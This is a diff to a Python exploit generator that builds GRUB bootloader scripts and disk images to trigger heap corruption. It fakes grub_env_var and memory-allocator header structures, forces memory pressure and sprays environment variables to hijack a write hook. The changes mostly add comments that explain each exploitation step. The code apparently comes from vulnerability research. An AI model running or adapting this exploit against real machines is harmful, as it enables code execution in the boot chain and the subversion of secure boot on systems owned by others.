@@ -39,6 +39,9 @@ class Primitive:
         return len(self._bodies)
 
     def setup(self, basepath):
+        """
+        Pre setup to create the files we need for exploitation.
+        """
         for idx, body in enumerate(self._bodies):
             # using it twice to give us a second chance with the protective mbr
             # + final gpt volume.
@@ -52,6 +55,9 @@ class Primitive:
                 f.write(res)
 
     def setup_cfg(self):
+        """
+        Setup that needs to be added to the config.
+        """
         res = []
         res += self._rf.setup()
         res += self._rf.define(
@@ -64,12 +70,18 @@ class Primitive:
         return res
 
     def set_active(self, body_offset):
+        """
+        Set base to be this specific body offset.
+        """
         res = []
         res += command(f'set base={self._name}_{body_offset}')
         res += command('loopback ${base} /x/${base}')
         return res
 
     def unset_active(self):
+        """
+        Unset the base.
+        """
         res = []
         res += command('loopback -d ${base}')
         res += command('unset base')
@@ -79,6 +91,9 @@ class Primitive:
         return [f'loopback -d {self._name}-{i}' for i in range(self.count())]
 
     def map_depth(self, depth):
+        """
+        Map the depth to a block we should mount the loopback from.
+        """
         assert depth <= self._max_depth
         offset = 1 + (self._max_depth - depth) * 3
         return offset
@@ -119,24 +134,34 @@ def clashgpt(basepath):
     with open(f'{basepath}/e.dat', 'wb') as f:
         f.write(envblock)
 
+    # Create our overwrite of a `struct grub_env_var`.
+    # we can skip most of the struct as most of it doesn't matter, making the
+    # exploit more reliable.
     fakeenv = grub_env_var(write_hook=0x30303030)[:8*5]
     teststr = 'Y' * (len(fakeenv) - 1)
     probe_b = grub_mm_header_t(3)
     probe_b += bytes(teststr, 'ascii') + b'\x00'
     probe_b += b'\x00' * (32 - (len(probe_b) % 32))
 
+    # Create the alignment + fake grub_mm_header_t.
+    # This is so we can unset the variable and have an free block that will
+    # only fit a `struct grub_env_var` and not the other allocations we might
+    # generate through normal usage.
     control_b = grub_mm_header_t(3)
     control_b += fakeenv
     control_b += b'\x00' * (32 - (len(control_b) % 32))
 
     assert len(control_b) == len(probe_b)
 
+    # Setup the two probes.
     probe = Primitive('base', probe_b)
     probe.setup(basepath)
 
     control = Primitive('over', control_b)
     control.setup(basepath)
 
+    # A way of construction large defined strings by splitting them across
+    # multiple variables, merging them together.
     vs = VarSplit(TRASH_ALLOC)
 
     trigger = []
@@ -155,6 +180,7 @@ def clashgpt(basepath):
 
     trigger += vs.define('t_0')
 
+    # We need to force memory pressure so a region exists below the stack.
     trigger += grub_print('[!] Forcing memory pressure')
     trigger += force_regions_to_exist()
     trigger += grub_print('[!] Setting up construction')
@@ -202,6 +228,8 @@ def clashgpt(basepath):
 
     # from this point on we need to be very careful about variable names, as
     # introducing a fake grub_env_var will make some inaccessible.
+    # We do not properly set the `next` member, so everything following it in
+    # the hash table row is invalid.
     internal = []
     internal += probe.unset_active()
     internal += control.set_active('${offset}')
@@ -209,6 +237,8 @@ def clashgpt(basepath):
     internal += grub_print('[!] going for the kill')
     internal += command('unset ${end}')
     # spray grub_env_vars to get one in our free slot
+    # using a large name and value so only the `struct grub_env_var` for the
+    # variable can end up in the free slot.
     for i in range(SPRAY_ENVVAR):
         internal += Variable(
             f'spray_{i}_'+'A'*96,
@@ -218,7 +248,7 @@ def clashgpt(basepath):
     internal += control.trigger('${depth_}', 'fun')
     # to obtain victory
     internal += command('set =1')
-    internal += ['break']
+    internal += command('break')
 
     trigger += while_loop('"${found}" != false', internal)
     trigger += grub_print('[!] done')
